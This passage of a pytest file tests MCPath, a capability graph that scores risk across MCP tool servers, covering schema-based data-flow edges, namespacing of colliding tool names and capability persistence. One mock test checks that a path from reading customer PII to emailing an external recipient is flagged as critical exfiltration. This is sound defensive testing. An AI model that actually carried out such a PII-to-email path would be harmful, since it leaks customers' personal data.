    assert cap_modify.data_target == "database_records"
    assert cap_modify.external_exposure == 0.0


# ---------------------------------------------------------------------------
# Test 19: Cross-Server FLOWS_TO from Schema Evidence (bulk_load_csv)
# ---------------------------------------------------------------------------

def test_cross_server_flows_to_bulk_load_csv_preserved():
    """Verify that postgres_mcp_bulk_load_csv correctly creates FLOWS_TO from filesystem_data

    because its input schema explicitly requires a file path.
    """
    server_tools = {
        "filesystem": [
            {
                "name": "read_file",
                "description": "Read file contents",
                "inputSchema": {"type": "object", "properties": {"path": {"type": "string"}}}
            }
        ],
        "postgres-mcp": [
            {
                "name": "postgres_mcp_bulk_load_csv",
                "description": "Bulk-load CSV file via COPY into a PostgreSQL table.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "connectionId": {"type": "string"},
                        "path": {"type": "string", "description": "Absolute path to CSV file to load"},
                        "table": {"type": "string"}
                    }
                }
            }
        ]
    }
    graph = CapabilityGraph()
    graph.rebuild_for_all_servers(server_tools)

    fs_res = "Resource:filesystem_data"
    assert graph.graph.has_node(fs_res)

    # Action for bulk_load_csv must be successor of Resource:filesystem_data
    bulk_action = "Action:postgres_mcp_bulk_load_csv:bulk_load_database"
    assert graph.graph.has_node(bulk_action)
    assert graph.graph.has_edge(fs_res, bulk_action), "Resource:filesystem_data -> bulk_action FLOWS_TO must exist based on schema evidence"

    edge = graph.graph.get_edge_data(fs_res, bulk_action)
    assert edge.get("relation") == "FLOWS_TO"


# ---------------------------------------------------------------------------
# Test 20: Safe Mock External-Action Test Server (customer_pii -> send_email)
# ---------------------------------------------------------------------------

def test_safe_mock_external_action_server_critical_override():
    """Verify SAFE MOCK external-action test server for Stage 2 only (no real email/network activity).

    customer_pii -> send_email -> External Destination.
    The graph must generate the compatible critical path and classify it HIGH independently of the weighted score.
    """
    mock_servers = {
        "mock_crm_server": [
            {
                "name": "read_customer",
                "description": "Read customer profile data containing sensitive PII and account details.",
                "inputSchema": {"type": "object", "properties": {"customer_id": {"type": "string"}}}
            }
        ],
        "mock_mailer_server": [
            {
                "name": "send_email",
                "description": "Simulates dispatching an email to an external recipient without actual network send.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "recipient": {"type": "string"},
                        "subject": {"type": "string"},
                        "body": {"type": "string"}
                    }
                }
            }
        ]
    }

    graph = CapabilityGraph()
    graph.rebuild_for_all_servers(mock_servers)

    # 1. Graph must enumerate the critical exfiltration path:
    # Agent -> Tool:read_customer -> Resource:customer_pii -> Action:send_email:external_communication -> Destination:external_recipient
    crm_paths = graph.get_paths_for_tool("read_customer")
    critical_paths = [
        p for p in crm_paths
        if "Resource:customer_pii" in p.path_nodes
        and any("send_email" in n for n in p.path_nodes)
        and any("external_recipient" in n for n in p.path_nodes)
    ]
    assert len(critical_paths) >= 1, "Graph must generate the compatible customer_pii -> send_email critical path"

    crit_path = critical_paths[0]
    assert crit_path.is_critical_override is True
    assert crit_path.classification == "HIGH"
    assert crit_path.path_risk_score >= 85.0
    assert "CRITICAL PATH OVERRIDE" in crit_path.explanation

    # 2. Runtime call sequence evaluation independently classified HIGH
    call_sequence = ["read_customer", "send_email"]
    eval_result = graph.evaluate_runtime_call("send_email", call_history=call_sequence)
    assert eval_result.classification == "HIGH"
    assert eval_result.is_critical_override is True
    assert eval_result.path_risk_score >= 85.0
    assert eval_result.data_sensitivity == 3.0
    assert eval_result.action_sensitivity == 3.0
    assert eval_result.external_exposure == 3.0



# ---------------------------------------------------------------------------
# Multi-server tool identity regression tests
# Requirement: CapabilityGraph must use the same canonical tool names as
# DownstreamClientManager.recompute_exposed_tools() for colliding tool names.
# ---------------------------------------------------------------------------


class TestMultiServerToolIdentity:
    """Regression tests for the multi-server tool identity (collision-namespacing) fix.

    Scenario mirrors the live five-server MCPath deployment where both the
    'filesystem' and 'rugpull-test' servers expose a tool named 'list_directory'.
    Before the fix this caused a silent overwrite producing:
      - 1 ghost 'Tool:list_directory' node (attributed to whichever server was
        processed last)
      - 1 lost classification (the first server's list_directory was discarded)
    After the fix the graph must match the exposed-catalog's canonical names:
      - 'filesystem_list_directory'
      - 'rugpull-test_list_directory'
    """

    LIST_DIR_TOOL = {
        "name": "list_directory",
        "description": "List the contents of a directory on the filesystem.",
        "inputSchema": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
    }

    EXTRA_UNIQUE_TOOL = {
        "name": "read_file",
        "description": "Read the contents of a file from the filesystem.",
        "inputSchema": {
            "type": "object",
            "properties": {"path": {"type": "string"}},
            "required": ["path"],
        },
    }

    def _build_collision_graph(self) -> CapabilityGraph:
        """Build a minimal graph that reproduces the filesystem/rugpull collision."""
        server_tools = {
            "filesystem": [self.LIST_DIR_TOOL, self.EXTRA_UNIQUE_TOOL],
            "rugpull-test": [self.LIST_DIR_TOOL],
        }
        graph = CapabilityGraph()
        graph.rebuild_for_all_servers(server_tools)
        return graph

    def test_collision_produces_two_namespaced_tool_capabilities(self):
        """Both colliding tools must appear in tool_capabilities under namespaced keys."""
        graph = self._build_collision_graph()
        assert "filesystem_list_directory" in graph.tool_capabilities, (
            "filesystem's list_directory must be stored as 'filesystem_list_directory'"
        )
        assert "rugpull-test_list_directory" in graph.tool_capabilities, (
            "rugpull-test's list_directory must be stored as 'rugpull-test_list_directory'"
        )

    def test_no_ghost_unnamespaced_list_directory_capability(self):
        """The raw un-namespaced key must NOT survive in tool_capabilities."""
        graph = self._build_collision_graph()
        assert "list_directory" not in graph.tool_capabilities, (
            "Ghost 'list_directory' entry must be absent after namespacing"
        )

    def test_two_distinct_tool_nodes_in_graph(self):
        """The graph must contain both namespaced Tool nodes."""
        graph = self._build_collision_graph()
        assert graph.graph.has_node("Tool:filesystem_list_directory"), (
            "Tool:filesystem_list_directory must be a graph node"
        )
        assert graph.graph.has_node("Tool:rugpull-test_list_directory"), (
            "Tool:rugpull-test_list_directory must be a graph node"
        )

    def test_no_ghost_tool_node_in_graph(self):
        """The unqualified Tool:list_directory ghost node must NOT exist."""
        graph = self._build_collision_graph()
        assert not graph.graph.has_node("Tool:list_directory"), (
            "Ghost 'Tool:list_directory' node must be absent from the graph"
        )

    def test_tool_capabilities_have_correct_server_attribution(self):
        graph = self._build_collision_graph()
        fs_cap = graph.tool_capabilities["filesystem_list_directory"]
        rp_cap = graph.tool_capabilities["rugpull-test_list_directory"]
        assert fs_cap.server_name == "filesystem"
        assert rp_cap.server_name == "rugpull-test"

    def test_tool_capability_tool_name_matches_canonical_key(self):
        """cap.tool_name must equal the dict key (canonical name)."""
        graph = self._build_collision_graph()
        for key, cap in graph.tool_capabilities.items():
            assert cap.tool_name == key, (
                f"tool_capabilities key '{key}' has cap.tool_name='{cap.tool_name}' -- mismatch"
            )

    def test_tool_count_equals_unique_exposed_names(self):
        """Graph tool count must match the number of unique canonical tool names."""
        graph = self._build_collision_graph()
        # 3 tools total: filesystem_list_directory, rugpull-test_list_directory, read_file
        assert len(graph.tool_capabilities) == 3, (
            f"Expected 3 distinct tool capabilities, got {len(graph.tool_capabilities)}"
        )

    def test_unique_tool_is_not_namespaced(self):
        """Tools that appear in only ONE server must keep their unqualified name."""
        graph = self._build_collision_graph()
        assert "read_file" in graph.tool_capabilities
        assert "filesystem_read_file" not in graph.tool_capabilities

    def test_agent_edges_target_canonical_tool_nodes(self):
        """Agent must have CAN_CALL edges to both namespaced Tool nodes."""
        graph = self._build_collision_graph()
        agent_targets = {v for _, v in graph.graph.out_edges("Agent")}
        assert "Tool:filesystem_list_directory" in agent_targets
        assert "Tool:rugpull-test_list_directory" in agent_targets
        assert "Tool:list_directory" not in agent_targets

    def test_add_tool_namespaces_on_collision(self):
        """add_tool must apply the same namespacing when a collision is detected."""
        graph = CapabilityGraph()
        graph.add_tool("filesystem", self.LIST_DIR_TOOL)
        assert "list_directory" in graph.tool_capabilities

        graph.add_tool("rugpull-test", self.LIST_DIR_TOOL)

        assert "filesystem_list_directory" in graph.tool_capabilities
        assert "rugpull-test_list_directory" in graph.tool_capabilities
        assert "list_directory" not in graph.tool_capabilities

    def test_add_tool_no_spurious_namespacing_for_unique_tools(self):
        """add_tool must NOT namespace a tool that has no collision."""
        graph = CapabilityGraph()
        graph.add_tool("filesystem", self.EXTRA_UNIQUE_TOOL)
        assert "read_file" in graph.tool_capabilities
        assert "filesystem_read_file" not in graph.tool_capabilities


# ---------------------------------------------------------------------------
# TestCapabilitiesPersistence: Verify capabilities table persistence & refresh
# ---------------------------------------------------------------------------

class TestCapabilitiesPersistence:
    """Verify that capabilities table is correctly populated and cleanly refreshed."""

    @pytest.mark.asyncio
    async def test_persist_tool_capabilities_populates_and_refreshes(self):
        from sqlalchemy import text
        from mcpath.backend.persistence.database import (
            persist_tool_capabilities,
            get_session_factory,
        )

        sample_caps = [
            {
                "tool_name": "filesystem_list_directory",
                "server_name": "filesystem",
                "data_target": "directory_contents",
                "operation": "READ",
                "action_type": "read_resource",
                "external_destination": None,
                "data_sensitivity": 1.0,
                "action_sensitivity": 1.0,
                "external_exposure": 0.0,
                "policy_version": "1.0.0",
                "raw_metadata": {"test": True},
            },
            {
                "tool_name": "send_email",
                "server_name": "email-server",
                "data_target": "email_message",
                "operation": "WRITE",
                "action_type": "external_communication",
                "external_destination": "external_recipient",
                "data_sensitivity": 2.0,
                "action_sensitivity": 3.0,
                "external_exposure": 3.0,
                "policy_version": "1.0.0",
                "raw_metadata": {"simulated": True},
            },
        ]

        # 1. First persistence pass: inserts 2 records
        await persist_tool_capabilities(sample_caps)

        factory = get_session_factory()
        async with factory() as s:
            res = await s.execute(text("SELECT tool_name, server_name, action, destination FROM capabilities ORDER BY tool_name"))
            rows = res.fetchall()
            assert len(rows) == 2, f"Expected 2 rows in capabilities, got {len(rows)}"
            names = [r[0] for r in rows]
            assert "filesystem_list_directory" in names
            assert "send_email" in names

        # 2. Second persistence pass with only 1 tool: must CLEAR old snapshot and refresh cleanly
        single_cap = [sample_caps[1]]
        await persist_tool_capabilities(single_cap)

        async with factory() as s:
            res = await s.execute(text("SELECT tool_name FROM capabilities"))
            rows = res.fetchall()
            assert len(rows) == 1, f"Expected 1 refreshed row in capabilities, got {len(rows)}"
            assert rows[0][0] == "send_email"
